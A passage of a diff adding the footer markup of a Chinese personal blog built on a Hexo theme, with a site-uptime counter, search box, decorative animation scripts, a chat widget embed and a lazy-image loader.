+        var days = hours * 24;
+        var years = days * 365;
+        var today = new Date();
+        var todayYear = today.getFullYear();
+        var todayMonth = today.getMonth() + 1;
+        var todayDate = today.getDate();
+        var todayHour = today.getHours();
+        var todayMinute = today.getMinutes();
+        var todaySecond = today.getSeconds();
+
+        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+        year - 作为date对象的年份，为4位年份值
+        month - 0-11之间的整数，做为date对象的月份
+        day - 1-31之间的整数，做为date对象的天数
+        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+        minutes - 0-59之间的整数，做为date对象的分钟数
+        seconds - 0-59之间的整数，做为date对象的秒数
+        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+
+        var t1 = Date.UTC(2020, 07, 23, 00, 00, 00); //北京时间2020-7-23 00:00:00
+        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+        var diff = t2 - t1;
+        var diffYears = Math.floor(diff / years);
+        var diffDays = Math.floor((diff / days) - diffYears * 365);
+        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+            minutes) / seconds);
+        document.getElementById("sitetime").innerHTML = "本站已勉强运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours +
+            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒" ;
+    } /*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+    siteTime();
+</script>
+
+
+
+
+
+
+        <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+        <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+        <script src="https://cdn.bootcss.com/materialize/1.0.0/js/materialize.min.js"></script>
+        <script src="https://cdn.bootcss.com/masonry/4.2.2/masonry.pkgd.min.js"></script>
+        <script src="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.js"></script>
+        <script src="https://cdn.bootcss.com/scrollprogress/3.0.2/scrollProgress.min.js"></script>
+        <script src="https://cdn.bootcss.com/lightgallery/1.6.12/js/lightgallery-all.min.js"></script>
+        <script src="/js/matery.js"></script>
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+        
+            <script src="/libs/others/clicklove.js"></script>
+        
+
+        
+            <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+
+        <!-- 洪卫 shw2018 add 2019.08.28 -->
+        <script type="text/javascript">
+            var OriginTitile = document.title,
+                st;
+            document.addEventListener("visibilitychange", function () {
+                document.hidden ? (document.title = "饮水思源，笃定前行~", clearTimeout(st)) : (document.title =
+                    "(๑•̀ㅂ•́) ✧被发现了～", st = setTimeout(function () {
+                        document.title = OriginTitile
+                    }, 3e3))
+            })
+        </script>
+
+        <!-- 鼠标点击烟花爆炸效果  洪卫 shw2018 add 2019.09.09 -->
+        
+            <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 1; pointer-events: none;"></canvas>
+            <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+            <script type="text/javascript" src="/js/fireworks.js"></script>
+        
+
+        <!-- 背景雪花飘落特效洪卫 shw2018 add 2019.09.10 -->
+        
+            <script type="text/javascript">
+            //只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+            }
+            </script>
+        
+
+        <!-- 鼠标点击文字特效 洪卫 shw2018 add 2019.09.10-->
+        
+            <script src="/js/wenzi.js" type="text/javascript"></script>
+        
+
+        <!-- 背景雪花飘落特效 洪卫 shw2018 add 2019.09.10 -->
+        
+            <script type="text/javascript">
+                var windowWidth = $(window).width();
+                if (windowWidth > 768) {
+                    document.write('<script type="text/javascript" src="/js/xuehuapiaoluo.js"><\/script>');
+                }
+            </script>
+        
+
+        <!-- 在线聊天工具  洪卫 shw2018 add 2019.09.11 -->
+        
+            <script src="//code.tidio.co/xxxxxxxxxxxxxxxxxxxxxxxxxxx.js"></script>
+            <!--  在线聊天位置自定义  洪卫 shw2018 add 2019.09.13  -->
+            <script> 
+                $(document).ready(function () {
+
+                    setInterval(change_Tidio, 50);  
+                    function change_Tidio() { 
+
+                        var tidio=$("#tidio-chat iframe");
+                        if(tidio.css("display")=="block"&& $(window).width()>977 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"80px":"20px";   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px";   
+                            document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        } 
+                        else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;   
+                            document.getElementById("tidio-chat-iframe").style.right="-15px"; 
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+                        else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
+                            document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;   
+                            document.getElementById("tidio-chat-iframe").style.zIndex="997";
+                        }
+
+                        if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
+                            document.getElementById("tidio-chat-iframe").style.zIndex="998";
+                        }
+                    } 
+                }); 
+            </script>
+        
+
+        <!-- 背景 canvas-nest  洪卫 shw 2018  add 2019.09.15-->
+        
+            <script type="text/javascript">
+            var windowWidth = $(window).width();
+            if (windowWidth > 992) {
+                document.write('<script type="text/javascript" color="0,0,255" pointColor="0,0,255" opacity= "0.8" zIndex="--1" count="150"src="/libs/background/canvas-nest.js"><\/script>');
+            }
+            </script>
+        
+
+        <!-- 背景静止彩带  洪卫 shw 2018  add 2019.09.15-->
+        
+
+        <!-- 背景动态彩带 洪卫 shw 2018  add 2019.09.15-->
+        
+            <script type="text/javascript">
+            var windowWidth = $(window).width();
+            if (windowWidth > 992) {
+                document.write('<script type="text/javascript" src="/libs/background/ribbon-dynamic.js"><\/script>');
+            }
+            </script>
+        
+
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
+</html>
